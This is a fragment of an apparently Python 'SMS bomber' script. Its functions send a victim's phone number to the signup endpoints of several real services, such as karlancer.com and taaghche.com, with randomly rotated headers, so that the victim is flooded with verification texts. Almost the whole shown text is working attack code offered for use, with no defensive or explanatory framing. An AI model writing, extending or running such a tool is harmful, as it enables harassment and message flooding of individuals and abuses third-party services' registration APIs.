...
def drdr_bomber(number):
    ...
    try:
        ...
        if req.status_code or req.status_code == 200:
...
def karlanser_bomber(number):
    random_choose = random.choice(heads)
    karlanser_api = 'https://www.karlancer.com/api/register'
    json_request_api = {"phone":"0"+number,"role":"freelancer"}
    try:
        req = requests.post(karlanser_api,json=json_request_api,headers=random_choose)
        if req.status_code == 200:
            print('karlanser Code Sent!')
        else:
            print(f"karlanser code: {req.status_code}")
    except:
        print('karlanser error!')
...
def tagche_bomber(number):
    random_choose = random.choice(heads)
    tagche_api = 'https://gw.taaghche.com/v4/site/auth/signup'
    json_request_api = {"contact": number}
    try:
        req = requests.post(tagche_api,json=json_request_api,headers=random_choose)
        if req.status_code == 200:
            print('tagche Code Sent!')
        else:
            print(f"tagche code: {req.status_code}")
    except:
        print('tagche error!')  
